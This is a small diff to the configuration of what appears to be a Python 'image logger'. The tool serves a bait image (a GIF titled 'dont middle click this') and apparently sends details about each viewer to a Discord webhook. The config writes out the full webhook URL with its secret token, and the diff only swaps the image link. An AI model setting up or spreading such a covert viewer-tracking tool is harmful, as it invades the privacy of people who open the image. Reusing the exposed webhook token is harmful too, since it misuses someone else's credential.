@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1198705174588428459/WkcnjSeuK3XbymxrfXgmTzQQSiC_yGIkDdZAumpKe2qyd-4K-NlJ1_YO-RQYFjYycu9A",
-    "image": "https://tenor.com/view/dont-middle-click-this-gif-gif-5755784118672546328", # You can also have a custom image by using a URL argument
+    "image": "https://media1.tenor.com/m/T-CnKRVP2hgAAAAd/dont-middle-click-this-gif.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
